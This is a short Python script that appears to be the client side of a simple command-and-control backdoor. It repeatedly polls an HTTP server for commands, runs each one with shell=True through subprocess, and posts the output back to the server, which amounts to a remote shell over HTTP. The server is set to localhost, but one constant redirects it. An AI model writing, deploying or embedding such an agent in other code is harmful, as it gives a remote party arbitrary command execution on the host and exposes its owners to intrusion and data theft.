import requests
import os
import json
import subprocess


SERVER_IP = 'http://127.0.0.1:5000'


def send(output):
    requests.post(SERVER_IP + '/server/send', json=output)


def main():
    cmd = ''
    while not cmd == 'exit':
        try:
            cmd = requests.post(SERVER_IP + '/server/recv', timeout=10).text
            if cmd == 'exit': requests.post(SERVER_IP + '/bye', timeout=10).text
        except requests.exceptions.ReadTimeout:
            continue
        result = subprocess.run(cmd, shell=True, capture_output=True, cwd=os.getcwd())
        output = result.stdout.decode()
        error = result.stderr.decode()

        send(error or output)


if __name__ == '__main__':
    main()